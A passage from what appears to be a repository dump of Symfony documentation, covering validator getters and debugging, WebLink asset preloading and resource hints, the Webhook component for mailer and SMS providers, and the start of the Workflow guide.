<!-- config/validator/validation.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <constraint-mapping xmlns=\"http://symfony.com/schema/dic/constraint-mapping\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/constraint-mapping\n                https://symfony.com/schema/dic/constraint-mapping/constraint-mapping-1.0.xsd\">\n\n            <class name=\"App\\Entity\\Author\">\n                <property name=\"firstName\">\n                    <constraint name=\"NotBlank\"/>\n                    <constraint name=\"Length\">\n                        <option name=\"min\">3</option>\n                    </constraint>\n                </property>\n            </class>\n        </constraint-mapping>\n\n    .. code-block:: php\n\n        // src/Entity/Author.php\n        namespace App\\Entity;\n\n        // ...\n        use Symfony\\Component\\Validator\\Constraints as Assert;\n        use Symfony\\Component\\Validator\\Mapping\\ClassMetadata;\n\n        class Author\n        {\n            private string $firstName;\n\n            public static function loadValidatorMetadata(ClassMetadata $metadata): void\n            {\n                $metadata->addPropertyConstraint('firstName', new Assert\\NotBlank());\n                $metadata->addPropertyConstraint(\n                    'firstName',\n                    new Assert\\Length(['min' => 3])\n                );\n            }\n        }\n\n.. warning::\n\n    The validator will use a value ``null`` if a typed property is uninitialized.\n    This can cause unexpected behavior if the property holds a value when initialized.\n    In order to avoid this, make sure all properties are initialized before validating them.\n\nGetters\n~~~~~~~\n\nConstraints can also be applied to the return value of a method. Symfony\nallows you to add a constraint to any private, protected or public method whose name starts with\n\"get\", \"is\" or \"has\". In this guide, these types of methods are referred to\nas \"getters\".\n\nThe benefit of this technique is that it allows you to validate your object\ndynamically. For example, suppose you want to make sure that a password field\ndoesn't match the first name of the user (for security reasons). You can\ndo this by creating an ``isPasswordSafe()`` method, and then asserting that\nthis method must return ``true``:\n\n.. configuration-block::\n\n    .. code-block:: php-attributes\n\n        // src/Entity/Author.php\n        namespace App\\Entity;\n\n        // ...\n        use Symfony\\Component\\Validator\\Constraints as Assert;\n\n        class Author\n        {\n            #[Assert\\IsTrue(message: 'The password cannot match your first name')]\n            public function isPasswordSafe(): bool\n            {\n                // ... return true or false\n            }\n        }\n\n    .. code-block:: yaml\n\n        # config/validator/validation.yaml\n        App\\Entity\\Author:\n            getters:\n                passwordSafe:\n                    - 'IsTrue': { message: 'The password cannot match your first name' }\n\n    .. code-block:: xml\n\n        <!-- config/validator/validation.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <constraint-mapping xmlns=\"http://symfony.com/schema/dic/constraint-mapping\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/constraint-mapping\n                https://symfony.com/schema/dic/constraint-mapping/constraint-mapping-1.0.xsd\">\n\n            <class name=\"App\\Entity\\Author\">\n                <getter property=\"passwordSafe\">\n                    <constraint name=\"IsTrue\">\n                        <option name=\"message\">The password cannot match your first name</option>\n                    </constraint>\n                </getter>\n            </class>\n        </constraint-mapping>\n\n    .. code-block:: php\n\n        // src/Entity/Author.php\n        namespace App\\Entity;\n\n        // ...\n        use Symfony\\Component\\Validator\\Constraints as Assert;\n        use Symfony\\Component\\Validator\\Mapping\\ClassMetadata;\n\n        class Author\n        {\n            public static function loadValidatorMetadata(ClassMetadata $metadata): void\n            {\n                $metadata->addGetterConstraint('passwordSafe', new Assert\\IsTrue([\n                    'message' => 'The password cannot match your first name',\n                ]));\n            }\n        }\n\nNow, create the ``isPasswordSafe()`` method and include the logic you need::\n\n    public function isPasswordSafe(): bool\n    {\n        return $this->firstName !== $this->password;\n    }\n\n.. note::\n\n    The keen-eyed among you will have noticed that the prefix of the getter\n    (\"get\", \"is\" or \"has\") is omitted in the mappings for the YAML, XML and PHP\n    formats. This allows you to move the constraint to a property with the same\n    name later (or vice versa) without changing your validation logic.\n\n.. _validation-class-target:\n\nClasses\n~~~~~~~\n\nSome constraints apply to the entire class being validated. For example,\nthe :doc:`Callback </reference/constraints/Callback>` constraint is a generic\nconstraint that's applied to the class itself. When that class is validated,\nmethods specified by that constraint are simply executed so that each can\nprovide more custom validation.\n\nValidating Object With Inheritance\n----------------------------------\n\nWhen you validate an object that extends another class, the validator\nautomatically validates constraints defined in the parent class as well.\n\n**The constraints defined in the parent properties will be applied to the child\nproperties even if the child properties override those constraints**. Symfony\nwill always merge the parent constraints for each property.\n\nYou can't change this behavior, but you can overcome it by defining the parent\nand the child constraints in different :doc:`validation groups </validation/groups>`\nand then select the appropriate group when validating each object.\n\nDebugging the Constraints\n-------------------------\n\nUse the ``debug:validator`` command to list the validation constraints of a\ngiven class:\n\n.. code-block:: terminal\n\n    $ php bin/console debug:validator 'App\\Entity\\SomeClass'\n\n        App\\Entity\\SomeClass\n        -----------------------------------------------------\n\n        +---------------+--------------------------------------------------+---------+------------------------------------------------------------+\n        | Property      | Name                                             | Groups  | Options                                                    |\n        +---------------+--------------------------------------------------+---------+------------------------------------------------------------+\n        | firstArgument | Symfony\\Component\\Validator\\Constraints\\NotBlank | Default | [                                                          |\n        |               |                                                  |         |   \"message\" => \"This value should not be blank.\",          |\n        |               |                                                  |         |   \"allowNull\" => false,                                    |\n        |               |                                                  |         |   \"normalizer\" => null,                                    |\n        |               |                                                  |         |   \"payload\" => null                                        |\n        |               |                                                  |         | ]                                                          |\n        | firstArgument | Symfony\\Component\\Validator\\Constraints\\Email    | Default | [                                                          |\n        |               |                                                  |         |   \"message\" => \"This value is not a valid email address.\", |\n        |               |                                                  |         |   \"mode\" => null,                                          |\n        |               |                                                  |         |   \"normalizer\" => null,                                    |\n        |               |                                                  |         |   \"payload\" => null                                        |\n        |               |                                                  |         | ]                                                          |\n        +---------------+--------------------------------------------------+---------+------------------------------------------------------------+\n\nYou can also validate all the classes stored in a given directory:\n\n.. code-block:: terminal\n\n    $ php bin/console debug:validator src/Entity\n\nFinal Thoughts\n--------------\n\nThe Symfony ``validator`` is a powerful tool that can be leveraged to\nguarantee that the data of any object is \"valid\". The power behind validation\nlies in \"constraints\", which are rules that you can apply to properties or\ngetter methods of your object. And while you'll most commonly use the validation\nframework indirectly when using forms, remember that it can be used anywhere\nto validate any object.\n\nLearn more\n----------\n\n.. toctree::\n    :maxdepth: 1\n    :glob:\n\n    /validation/*\n\n.. _Validator: https://github.com/symfony/validator\n.. _JSR303 Bean Validation specification: https://jcp.org/en/jsr/detail?id=303\n"
        },
        {
          "name": "validation",
          "type": "tree",
          "content": null
        },
        {
          "name": "web_link.rst",
          "type": "blob",
          "size": 8.439453125,
          "content": "Asset Preloading and Resource Hints with HTTP/2 and WebLink\n===========================================================\n\nSymfony provides native support (via the `WebLink`_ component)\nfor managing ``Link`` HTTP headers, which are the key to improve the application\nperformance when using HTTP/2 and preloading capabilities of modern web browsers.\n\n``Link`` headers are used in `HTTP/2 Server Push`_ and W3C's `Resource Hints`_\nto push resources (e.g. CSS and JavaScript files) to clients before they even\nknow that they need them. WebLink also enables other optimizations that work\nwith HTTP 1.x:\n\n* Asking the browser to fetch or to render another web page in the background;\n* Making early DNS lookups, TCP handshakes or TLS negotiations.\n\nSomething important to consider is that all these HTTP/2 features require a\nsecure HTTPS connection, even when working on your local machine. The main web\nservers (Apache, nginx, Caddy, etc.) support this, but you can also use the\n`Docker installer and runtime for Symfony`_ created by Kévin Dunglas, from the\nSymfony community.\n\nInstallation\n------------\n\nIn applications using :ref:`Symfony Flex <symfony-flex>`, run the following command\nto install the WebLink feature before using it:\n\n.. code-block:: terminal\n\n    $ composer require symfony/web-link\n\nPreloading Assets\n-----------------\n\nImagine that your application includes a web page like this:\n\n.. code-block:: html\n\n    <!DOCTYPE html>\n    <html>\n    <head>\n        <meta charset=\"UTF-8\">\n        <title>My Application</title>\n        <link rel=\"stylesheet\" href=\"/app.css\">\n    </head>\n    <body>\n        <main role=\"main\" class=\"container\">\n            <!-- ... -->\n        </main>\n    </body>\n    </html>\n\nIn a traditional HTTP workflow, when this page is loaded, browsers make one\nrequest for the HTML document and another for the linked CSS file. However,\nwith HTTP/2, your application can send the CSS file's contents to the browser\nbefore it requests them.\n\nTo achieve this, update your template to use the ``preload()`` Twig function\nprovided by WebLink. Note that the `\"as\" attribute`_ is required, as browsers use\nit to prioritize resources correctly and comply with the content security policy:\n\n.. code-block:: html+twig\n\n    <head>\n        <!-- ... -->\n        {# note that you must add two <link> tags per asset:\n           one to link to it and the other one to tell the browser to preload it #}\n        <link rel=\"preload\" href=\"{{ preload('/app.css', {as: 'style'}) }}\" as=\"style\">\n        <link rel=\"stylesheet\" href=\"/app.css\">\n    </head>\n\nIf you reload the page, the perceived performance will improve because the\nserver responded with both the HTML page and the CSS file when the browser only\nrequested the HTML page.\n\n.. tip::\n\n    When using the :doc:`AssetMapper component </frontend/asset_mapper>` to link\n    to assets (e.g. ``importmap('app')``), there's no need to add the ``<link rel=\"preload\">``\n    tag. The ``importmap()`` Twig function automatically adds the ``Link`` HTTP\n    header for you when the WebLink component is available.\n\n.. note::\n\n    You can preload an asset by wrapping it with the ``preload()`` function:\n\n    .. code-block:: html+twig\n\n        <head>\n            <!-- ... -->\n            <link rel=\"preload\" href=\"{{ preload(asset('build/app.css')) }}\" as=\"style\">\n            <!-- ... -->\n        </head>\n\nAdditionally, according to `the Priority Hints specification`_, you can signal\nthe priority of the resource to download using the ``importance`` attribute:\n\n.. code-block:: html+twig\n\n    <head>\n        <!-- ... -->\n        <link rel=\"preload\" href=\"{{ preload('/app.css', {as: 'style', importance: 'low'}) }}\" as=\"style\">\n        <!-- ... -->\n    </head>\n\nHow does it work?\n~~~~~~~~~~~~~~~~~\n\nThe WebLink component manages the ``Link`` HTTP headers added to the response.\nWhen using the ``preload()`` function in the previous example, the following\nheader was added to the response: ``Link </app.css>; rel=\"preload\"; as=\"style\"``\nAccording to `the Preload specification`_, when an HTTP/2 server detects that\nthe original (HTTP 1.x) response contains this HTTP header, it will\nautomatically trigger a push for the related file in the same HTTP/2 connection.\n\nPopular proxy services and CDNs including `Cloudflare`_, `Fastly`_ and `Akamai`_\nalso leverage this feature. It means that you can push resources to clients and\nimprove performance of your applications in production right now.\n\nIf you want to prevent the push but let the browser preload the resource by\nissuing an early separate HTTP request, use the ``nopush`` option:\n\n.. code-block:: html+twig\n\n    <head>\n        <!-- ... -->\n        <link rel=\"preload\" href=\"{{ preload('/app.css', {as: 'style', nopush: true}) }}\" as=\"style\">\n        <!-- ... -->\n    </head>\n\nResource Hints\n--------------\n\n`Resource Hints`_ are used by applications to help browsers when deciding which\nresources should be downloaded, preprocessed or connected to first.\n\nThe WebLink component provides the following Twig functions to send those hints:\n\n* ``dns_prefetch()``: \"indicates an origin (e.g. ``https://foo.cloudfront.net``)\n  that will be used to fetch required resources, and that the user agent should\n  resolve as early as possible\".\n* ``preconnect()``: \"indicates an origin (e.g. ``https://www.google-analytics.com``)\n  that will be used to fetch required resources. Initiating an early connection,\n  which includes the DNS lookup, TCP handshake, and optional TLS negotiation, allows\n  the user agent to mask the high latency costs of establishing a connection\".\n* ``prefetch()``: \"identifies a resource that might be required by the next\n  navigation, and that the user agent *should* fetch, such that the user agent\n  can deliver a faster response once the resource is requested in the future\".\n* ``prerender()``: \"identifies a resource that might be required by the next\n  navigation, and that the user agent *should* fetch and execute, such that the\n  user agent can deliver a faster response once the resource is requested later\".\n\nThe component also supports sending HTTP links not related to performance and\nany link implementing the `PSR-13`_ standard. For instance, any\n`link defined in the HTML specification`_:\n\n.. code-block:: html+twig\n\n    <head>\n        <!-- ... -->\n        <link rel=\"alternate\" href=\"{{ link('/index.jsonld', 'alternate') }}\">\n        <link rel=\"preload\" href=\"{{ preload('/app.css', {as: 'style', nopush: true}) }}\" as=\"style\">\n        <!-- ... -->\n    </head>\n\nThe previous snippet will result in this HTTP header being sent to the client:\n``Link: </index.jsonld>; rel=\"alternate\",</app.css>; rel=\"preload\"; nopush``\n\nYou can also add links to the HTTP response directly from controllers and services::\n\n    // src/Controller/BlogController.php\n    namespace App\\Controller;\n\n    use Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController;\n    use Symfony\\Component\\HttpFoundation\\Request;\n    use Symfony\\Component\\HttpFoundation\\Response;\n    use Symfony\\Component\\WebLink\\GenericLinkProvider;\n    use Symfony\\Component\\WebLink\\Link;\n\n    class BlogController extends AbstractController\n    {\n        public function index(Request $request): Response\n        {\n            // using the addLink() shortcut provided by AbstractController\n            $this->addLink($request, (new Link('preload', '/app.css'))->withAttribute('as', 'style'));\n\n            // alternative if you don't want to use the addLink() shortcut\n            $linkProvider = $request->attributes->get('_links', new GenericLinkProvider());\n            $request->attributes->set('_links', $linkProvider->withLink(\n                (new Link('preload', '/app.css'))->withAttribute('as', 'style')\n            ));\n\n            return $this->render('...');\n        }\n    }\n\n.. _`WebLink`: https://github.com/symfony/web-link\n.. _`HTTP/2 Server Push`: https://tools.ietf.org/html/rfc7540#section-8.2\n.. _`Resource Hints`: https://www.w3.org/TR/resource-hints/\n.. _`Docker installer and runtime for Symfony`: https://github.com/dunglas/symfony-docker\n.. _`\"as\" attribute`: https://w3c.github.io/preload/#as-attribute\n.. _`the Priority Hints specification`: https://wicg.github.io/priority-hints/\n.. _`the Preload specification`: https://www.w3.org/TR/preload/#server-push-http-2\n.. _`Cloudflare`: https://blog.cloudflare.com/announcing-support-for-http-2-server-push-2/\n.. _`Fastly`: https://docs.fastly.com/en/guides/http2-server-push\n.. _`Akamai`: https://http2.akamai.com/\n.. _`link defined in the HTML specification`: https://html.spec.whatwg.org/dev/links.html#linkTypes\n.. _`PSR-13`: https://www.php-fig.org/psr/psr-13/\n"
        },
        {
          "name": "webhook.rst",
          "type": "blob",
          "size": 7.3779296875,
          "content": "Webhook\n=======\n\nThe Webhook component is used to respond to remote webhooks to trigger actions\nin your application. This document focuses on using webhooks to listen to remote\nevents in other Symfony components.\n\nInstallation\n------------\n\n.. code-block:: terminal\n\n    $ composer require symfony/webhook\n\nUsage in Combination with the Mailer Component\n----------------------------------------------\n\nWhen using a third-party mailer provider, you can use the Webhook component to\nreceive webhook calls from this provider.\n\nCurrently, the following third-party mailer providers support webhooks:\n\n============== ============================================\nMailer Service Parser service name\n============== ============================================\nBrevo          ``mailer.webhook.request_parser.brevo``\nMailerSend     ``mailer.webhook.request_parser.mailersend``\nMailgun        ``mailer.webhook.request_parser.mailgun``\nMailjet        ``mailer.webhook.request_parser.mailjet``\nPostmark       ``mailer.webhook.request_parser.postmark``\nResend         ``mailer.webhook.request_parser.resend``\nSendgrid       ``mailer.webhook.request_parser.sendgrid``\n============== ============================================\n\n.. versionadded:: 7.1\n\n    The support for ``Resend`` and ``MailerSend`` were introduced in Symfony 7.1.\n\n.. note::\n\n    Install the third-party mailer provider you want to use as described in the\n    documentation of the :ref:`Mailer component <mailer_3rd_party_transport>`.\n    Mailgun is used as the provider in this document as an example.\n\nTo connect the provider to your application, you need to configure the Webhook\ncomponent routing:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/framework.yaml\n        framework:\n            webhook:\n                routing:\n                    mailer_mailgun:\n                        service: 'mailer.webhook.request_parser.mailgun'\n                        secret: '%env(MAILER_MAILGUN_SECRET)%'\n\n    .. code-block:: xml\n\n        <!-- config/packages/framework.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n                   xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n                   xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n                   xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                        https://symfony.com/schema/dic/services/services-1.0.xsd\n                        http://symfony.com/schema/dic/symfony https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n            <framework:config>\n                <framework:webhook enabled=\"true\">\n                    <framework:routing type=\"mailer_mailgun\">\n                        <framework:service>mailer.webhook.request_parser.mailgun</framework:service>\n                        <framework:secret>%env(MAILER_MAILGUN_SECRET)%</framework:secret>\n                    </framework:routing>\n                </framework:webhook>\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/framework.php\n        use App\\Webhook\\MailerWebhookParser;\n        use Symfony\\Config\\FrameworkConfig;\n        return static function (FrameworkConfig $frameworkConfig): void {\n            $webhookConfig = $frameworkConfig->webhook();\n            $webhookConfig\n                ->routing('mailer_mailgun')\n                ->service('mailer.webhook.request_parser.mailgun')\n                ->secret('%env(MAILER_MAILGUN_SECRET)%')\n            ;\n        };\n\nIn this example, we are using ``mailer_mailgun`` as the webhook routing name.\nThe routing name must be unique as this is what connects the provider with your\nwebhook consumer code.\n\nThe webhook routing name is part of the URL you need to configure at the\nthird-party mailer provider. The URL is the concatenation of your domain name\nand the routing name you chose in the configuration (like\n``https://example.com/webhook/mailer_mailgun``.\n\nFor Mailgun, you will get a secret for the webhook. Store this secret as\nMAILER_MAILGUN_SECRET (in the :doc:`secrets management system\n</configuration/secrets>` or in a ``.env`` file).\n\nWhen done, add a :class:`Symfony\\\\Component\\\\RemoteEvent\\\\RemoteEvent` consumer\nto react to incoming webhooks (the webhook routing name is what connects your\nclass to the provider).\n\nFor mailer webhooks, react to the\n:class:`Symfony\\\\Component\\\\RemoteEvent\\\\Event\\\\Mailer\\\\MailerDeliveryEvent` or\n:class:`Symfony\\\\Component\\\\RemoteEvent\\\\Event\\\\Mailer\\\\MailerEngagementEvent`\nevents::\n\n    use Symfony\\Component\\RemoteEvent\\Attribute\\AsRemoteEventConsumer;\n    use Symfony\\Component\\RemoteEvent\\Consumer\\ConsumerInterface;\n    use Symfony\\Component\\RemoteEvent\\Event\\Mailer\\MailerDeliveryEvent;\n    use Symfony\\Component\\RemoteEvent\\Event\\Mailer\\MailerEngagementEvent;\n    use Symfony\\Component\\RemoteEvent\\RemoteEvent;\n\n    #[AsRemoteEventConsumer('mailer_mailgun')]\n    class WebhookListener implements ConsumerInterface\n    {\n        public function consume(RemoteEvent $event): void\n        {\n            if ($event instanceof MailerDeliveryEvent) {\n                $this->handleMailDelivery($event);\n            } elseif ($event instanceof MailerEngagementEvent) {\n                $this->handleMailEngagement($event);\n            } else {\n                // This is not an email event\n                return;\n            }\n        }\n\n        private function handleMailDelivery(MailerDeliveryEvent $event): void\n        {\n            // Handle the mail delivery event\n        }\n\n        private function handleMailEngagement(MailerEngagementEvent $event): void\n        {\n            // Handle the mail engagement event\n        }\n    }\n\nUsage in Combination with the Notifier Component\n------------------------------------------------\n\nThe usage of the Webhook component when using a third-party transport in\nthe Notifier is very similar to the usage with the Mailer.\n\nCurrently, the following third-party SMS transports support webhooks:\n\n============ ==========================================\nSMS service  Parser service name\n============ ==========================================\nTwilio       ``notifier.webhook.request_parser.twilio``\nVonage       ``notifier.webhook.request_parser.vonage``\n============ ==========================================\n\nFor SMS webhooks, react to the\n:class:`Symfony\\\\Component\\\\RemoteEvent\\\\Event\\\\Sms\\\\SmsEvent` event::\n\n    use Symfony\\Component\\RemoteEvent\\Attribute\\AsRemoteEventConsumer;\n    use Symfony\\Component\\RemoteEvent\\Consumer\\ConsumerInterface;\n    use Symfony\\Component\\RemoteEvent\\Event\\Sms\\SmsEvent;\n    use Symfony\\Component\\RemoteEvent\\RemoteEvent;\n\n    #[AsRemoteEventConsumer('notifier_twilio')]\n    class WebhookListener implements ConsumerInterface\n    {\n        public function consume(RemoteEvent $event): void\n        {\n            if ($event instanceof SmsEvent) {\n                $this->handleSmsEvent($event);\n            } else {\n                // This is not an SMS event\n                return;\n            }\n        }\n\n        private function handleSmsEvent(SmsEvent $event): void\n        {\n            // Handle the SMS event\n        }\n    }\n\nCreating a Custom Webhook\n-------------------------\n\n.. tip::\n\n    Starting in `MakerBundle`_ ``v1.58.0``, you can run ``php bin/console make:webhook``\n    to generate the request parser and consumer files needed to create your own\n    Webhook.\n\n.. _`MakerBundle`: https://symfony.com/doc/current/bundles/SymfonyMakerBundle/index.html\n"
        },
        {
          "name": "workflow.rst",
          "type": "blob",
          "size": 46.830078125,
          "content": "Workflow\n========\n\nUsing the Workflow component inside a Symfony application requires knowing first\nsome basic theory and concepts about workflows and state machines.\n:doc:`Read this article </workflow/workflow-and-state-machine>` for a quick overview.\n\nInstallation\n------------\n\nIn applications using :ref:`Symfony Flex <symfony-flex>`, run this command to\ninstall the workflow feature before using it:\n\n.. code-block:: terminal\n\n    $ composer require symfony/workflow\n\nConfiguration\n-------------\n\nTo see all configuration options, if you are using the component inside a\nSymfony project run this command:\n\n.. code-block:: terminal\n\n    $ php bin/console config:dump-reference framework workflows\n\nCreating a Workflow\n-------------------\n\nA workflow is a process or a lifecycle that your objects go through. Each\nstep or stage in the process is called a *place*. You also define *transitions*,\nwhich describe the action needed to get from one place to another.\n\n.. image:: /_images/components/workflow/states_transitions.png\n    :alt: An example state diagram for a workflow, showing transitions and places.\n\nA set of places and transitions creates a **definition**. A workflow needs\na ``Definition`` and a way to write the states to the objects (i.e. an\ninstance of a :class:`Symfony\\\\Component\\\\Workflow\\\\MarkingStore\\\\MarkingStoreInterface`.)\n\nConsider the following example for a blog post. A post can have these places:\n``draft``, ``reviewed``, ``rejected``, ``published``. You could define the workflow as\nfollows:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/workflow.yaml\n        framework:\n            workflows:\n                blog_publishing:\n                    type: 'workflow' # or 'state_machine'\n                    audit_trail:\n                        enabled: true\n                    marking_store:\n                        type: 'method'\n                        property: 'currentPlace'\n                    supports:\n                        - App\\Entity\\BlogPost\n                    initial_marking: draft\n                    places:          # defining places manually is optional\n                        - draft\n                        - reviewed\n                        - rejected\n                        - published\n                    transitions:\n                        to_review:\n                            from: draft\n                            to:   reviewed\n                        publish:\n                            from: reviewed\n                            to:   published\n                        reject:\n                            from: reviewed\n                            to:   rejected\n\n    .. code-block:: xml\n\n        <!-- config/packages/workflow.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:framework=\"http://symfony.com/schema/dic/symfony\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n            https://symfony.com/schema/dic/services/services-1.0.xsd\n            http://symfony.com/schema/dic/symfony\n            https://symfony.com/schema/dic/symfony/symfony-1.0.xsd\">\n\n            <framework:config>\n                <!-- or type=\"state_machine\" -->\n                <framework:workflow name=\"blog_publishing\" type=\"workflow\">\n                    <framework:audit-trail enabled=\"true\"/>\n                    <framework:marking-store type=\"single_state\">\n                        <framework:argument>currentPlace</framework:argument>\n                    </framework:marking-store>\n                    <framework:support>App\\Entity\\BlogPost</framework:support>\n                    <framework:initial-marking>draft</framework:initial-marking>\n\n                    <!-- defining places manually is optional -->\n                    <framework:place>draft</framework:place>\n                    <framework:place>reviewed</framework:place>\n                    <framework:place>rejected</framework:place>\n                    <framework:place>published</framework:place>\n\n                    <framework:transition name=\"to_review\">\n                        <framework:from>draft</framework:from>\n                        <framework:to>reviewed</framework:to>\n                    </framework:transition>\n                    <framework:transition name=\"publish\">\n                        <framework:from>reviewed</framework:from>\n                        <framework:to>published</framework:to>\n                    </framework:transition>\n                    <framework:transition name=\"reject\">\n                        <framework:from>reviewed</framework:from>\n                        <framework:to>rejected</framework:to>\n                    </framework:transition>\n                </framework:workflow>\n            </framework:config>\n        </container>\n\n    .. code-block:: php\n\n        // config/packages/workflow.php\n        use App\\Entity\\BlogPost;\n        use Symfony\\Config\\FrameworkConfig;\n\n        return static function (FrameworkConfig $framework): void {\n            $blogPublishing = $framework->workflows()->workflows('blog_publishing');\n            $blogPublishing\n                ->type('workflow') // or 'state_machine'\n                ->supports([BlogPost::class])\n                ->initialMarking(['draft']);\n\n            $blogPublishing->auditTrail()->enabled(true);\n            $blogPublishing->markingStore()\n                ->type('method')\n                ->property('currentPlace');\n\n            // defining places manually is optional\n            $blogPublishing->place()->name('draft');\n            $blogPublishing->place()->name('reviewed');\n            $blogPublishing->place()->name('rejected');\n            $blogPublishing->place()->name('published');\n\n            $blogPublishing->transition()\n                ->name('to_review')\n                    ->from(['draft'])\n                    ->to(['reviewed']);\n\n            $blogPublishing->transition()\n                ->name('publish')\n                    ->from(['reviewed'])\n                    ->to(['published']);\n\n            $blogPublishing->transition()\n                ->name('reject')\n                    ->from(['reviewed'])\n                    ->to(['rejected']);\n        };\n\n.. tip::\n\n    If you are creating your first workflows, consider using the ``workflow:dump``\n    command to :doc:`debug the workflow contents </workflow/dumping-workflows>`.\n\n.. tip::\n\n    You can use PHP constants in YAML files via the ``!php/const `` notation.\n    E.g. you can use ``!php/const App\\Entity\\BlogPost::STATE_DRAFT`` instead of\n    ``'draft'`` or ``!php/const App\\Entity\\BlogPost::TRANSITION_TO_REVIEW``\n    instead of ``'to_review'``.\n\n.. tip::\n\n    You can omit the ``places`` option if your transitions define all the places\n    that are used in the workflow. Symfony will automatically extract the places\n    from the transitions.\n\n    .. versionadded:: 7.1\n\n        The support for omitting the ``places`` option was introduced in\n        Symfony 7.1.\n\nThe configured property will be used via its implemented getter/setter methods by the marking store::\n\n    // src/Entity/BlogPost.php\n    namespace App\\Entity;\n\n    class BlogPost\n    {\n        // the configured marking store property must be declared\n        private string $currentPlace;\n        private string $title;\n        private string $content;\n\n        // getter/setter methods must exist for property access by the marking store\n        public function getCurrentPlace(): string\n        {\n            return $this->currentPlace;\n        }\n\n        public function setCurrentPlace(string $currentPlace, array $context = []): void\n        {\n            $this->currentPlace = $currentPlace;\n        }\n\n        // you don't need to set the initial marking in the constructor or any other method;\n        // this is configured in the workflow with the 'initial_marking' option\n    }\n\nIt is also possible to use public properties for the marking store. The above\nclass would become the following::\n\n    // src/Entity/BlogPost.php\n    namespace App\\Entity;\n\n    class BlogPost\n    {\n        // the configured marking store property must be declared\n        public string $currentPlace;\n        public string $title;\n        public string $content;\n    }\n\nWhen using public properties, context is not supported. In order to support it,\nyou must declare a setter to write your property::\n\n    // src/Entity/BlogPost.php\n    namespace App\\Entity;\n\n    class BlogPost\n    {\n        public string $currentPlace;\n        // ...\n\n        public function setCurrentPlace(string $currentPlace, array $context = []): void\n        {\n            // assign the property and do something with the context\n        }\n    }\n\n.. note::\n\n    The marking store type could be \"multiple_state\" or \"single_state\". A single\n    state marking store does not support a model being on multiple places at the\n    same time. This means a \"workflow\" must use a \"multiple_state\" marking store\n    and a \"state_machine\" must use a \"single_state\" marking store. Symfony\n    configures the marking store according to the \"type\" by default, so it's\n    preferable to not configure it.\n\n    A single state marking store uses a ``string`` to store the data. A multiple\n    state marking store uses an ``array`` to store the data. If no state marking\n    store is defined you have to return ``null`` in both cases (e.g. the above\n    example should define a return type like ``App\\Entity\\BlogPost::getCurrentPlace(): ?array``\n    or like ``App\\Entity\\BlogPost::getCurrentPlace(): ?string``).\n\n.. tip::\n\n    The ``marking_store.type`` (the default value depends on the ``type`` value)\n    and ``property`` (default value ``['marking']``) attributes of the\n    ``marking_store`` option are optional. If omitted, their default values will\n    be used. It's highly recommended to use the default value.\n\n.. tip::\n\n    Setting the ``audit_trail.enabled`` option to ``true`` makes the application\n    generate detailed log messages for the workflow activity.\n\nWith this workflow named ``blog_publishing``, you can get help to decide\nwhat actions are allowed on a blog post::\n\n    use App\\Entity\\BlogPost;\n    use Symfony\\Component\\Workflow\\Exception\\LogicException;\n\n    $post = new BlogPost();\n    // you don't need to set the initial marking with code; this is configured\n    // in the workflow with the 'initial_marking' option\n\n    $workflow = $this->container->get('workflow.blog_publishing');\n    $workflow->can($post, 'publish'); // False\n    $workflow->can($post, 'to_review'); // True\n\n    // Update the currentState on the post\n    try {\n        $workflow->apply($post, 'to_review');\n    } catch (LogicException $exception) {\n        // ...\n    }\n\n    // See all the available transitions for the post in the current state\n    $transitions = $workflow->getEnabledTransitions($post);\n    // See a specific available transition for the post in the current state\n    $transition = $workflow->getEnabledTransition($post, 'publish');\n\nUsing a multiple state marking store\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nIf you are creating a :doc:`workflow </workflow/workflow-and-state-machine>`,\nyour marking store may need to contain multiple places at the same time. That's why,\nif you are using Doctrine, the matching column definition should use the type ``json``::\n\n    // src/Entity/BlogPost.php\n    namespace App\\Entity;\n\n    use Doctrine\\DBAL\\Types\\Types;\n    use Doctrine\\ORM\\Mapping as ORM;\n\n    #[ORM\\Entity]\n    class BlogPost\n    {\n        #[ORM\\Id]\n        #[ORM\\GeneratedValue]\n        #[ORM\\Column]\n        private int $id;\n\n        #[ORM\\Column(type: Types::JSON)]\n        private array $currentPlaces;\n\n        // ...\n    }\n\n.. warning::\n\n    You should not use the type ``simple_array`` for your marking store. Inside\n    a multiple state marking store, places are stored as keys with a value of one,\n    such as ``['draft' => 1]``. If the marking store contains only one place,\n    this Doctrine type will store its value only as a string, resulting in the\n    loss of the object's current place.\n\nAccessing the Workflow in a Class\n---------------------------------\n\nYou can use the workflow inside a class by using\n:doc:`service autowiring </service_container/autowiring>` and using\n``camelCased workflow name + Workflow`` as parameter name. If it is a state\nmachine type, use ``camelCased workflow name + StateMachine``::\n\n    use App\\Entity\\BlogPost;\n    use Symfony\\Component\\Workflow\\WorkflowInterface;\n\n    class MyClass\n    {\n        public function __construct(\n            // Symfony will inject the 'blog_publishing' workflow configured before\n            private WorkflowInterface $blogPublishingWorkflow,\n        ) {\n        }\n\n        public function toReview(BlogPost $post): void\n        {\n            // Update the currentState on the post\n            try {\n                $this->blogPublishingWorkflow->apply($post, 'to_review');\n            } catch (LogicException $exception) {\n                // ...\n            }\n            // ...\n        }\n    }\n\nTo get the enabled transition of a Workflow, you can use\n:method:`Symfony\\\\Component\\\\Workflow\\\\WorkflowInterface::getEnabledTransition`\nmethod.\n\n.. versionadded:: 